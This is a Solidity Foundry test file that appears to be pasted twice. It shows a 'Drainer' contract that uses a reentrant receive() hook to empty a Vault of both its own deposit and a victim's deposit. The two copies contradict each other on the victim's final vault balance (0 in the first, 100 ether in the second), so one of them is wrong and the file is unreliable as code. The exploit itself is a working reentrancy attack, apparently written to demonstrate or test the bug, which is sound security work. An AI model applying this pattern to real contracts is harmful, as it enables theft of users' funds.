// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";

/// @notice Malicious reentrant caller.
contract Drainer {
    Vault vault;
    uint256 depth;

    constructor(Vault _vault) {
        vault = _vault;
    }

    function attack() external {
        vault.withdraw();
    }

    // Re-enter withdraw() while the vault still has NOT zeroed our balance.
    receive() external payable {
        if (depth < 1 && vault.balanceOf(address(this)) > 0) {
            depth++;
            vault.withdraw();
            depth--;
        }
    }
}

contract VaultDrainTest is Test {
    Vault vault;
    Drainer drainer;
    address victim;

    function setUp() public {
        vault = new Vault();
        drainer = new Drainer(vault);
        victim = address(0xA77CE);

        // Attacker deposits 100 ETH
        vm.deal(address(drainer), 100 ether);
        vm.prank(address(drainer));
        vault.deposit{value: 100 ether}();

        // Victim deposits 100 ETH
        vm.deal(victim, 100 ether);
        vm.prank(victim);
        vault.deposit{value: 100 ether}();
    }

    function test_ReentrancyDrainsEntireVault() public {
        assertEq(vault.totalAssets(), 200 ether);
        assertEq(address(drainer).balance, 0);

        vm.prank(address(drainer));
        drainer.attack();

        // Attacker walks away with the ENTIRE vault, including victim's 100 ETH.
        assertEq(vault.totalAssets(), 0);
        assertEq(address(drainer).balance, 200 ether);
        assertEq(vault.balanceOf(victim), 0); // victim owed 100 ETH, got 0
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";

/// @notice Malicious reentrant caller.
contract Drainer {
    Vault vault;
    uint256 depth;

    constructor(Vault _vault) {
        vault = _vault;
    }

    function attack() external {
        vault.withdraw();
    }

    // Re-enter withdraw() while the vault has NOT yet zeroed our balance.
    receive() external payable {
        if (depth < 1 && vault.balanceOf(address(this)) > 0) {
            depth++;
            vault.withdraw();
            depth--;
        }
    }
}

contract VaultDrainTest is Test {
    Vault vault;
    Drainer drainer;
    address victim;

    function setUp() public {
        vault = new Vault();
        drainer = new Drainer(vault);
        victim = address(0xA77CE);

        // Attacker deposits 100 ETH
        vm.deal(address(drainer), 100 ether);
        vm.prank(address(drainer));
        vault.deposit{value: 100 ether}();

        // Victim deposits 100 ETH
        vm.deal(victim, 100 ether);
        vm.prank(victim);
        vault.deposit{value: 100 ether}();
    }

    function test_ReentrancyDrainsEntireVault() public {
        // Precondition: vault holds 200 ETH (100 attacker + 100 victim)
        assertEq(vault.totalAssets(), 200 ether);
        assertEq(vault.balanceOf(address(drainer)), 100 ether);
        assertEq(address(drainer).balance, 0);

        vm.prank(address(drainer));
        drainer.attack();

        // Post-attack: vault is drained. Attacker holds all 200 ETH,
        // having deposited only 100 -> stole the victim's 100 ETH.
        assertEq(vault.totalAssets(), 0, "vault not drained");
        assertEq(address(drainer).balance, 200 ether, "attacker did not drain vault");

        // Victim's accounting balance still says 100 ETH, but the vault
        // is empty: the claim is worthless.
        assertEq(vault.balanceOf(victim), 100 ether);
        assertEq(victim.balance, 0);
    }
}

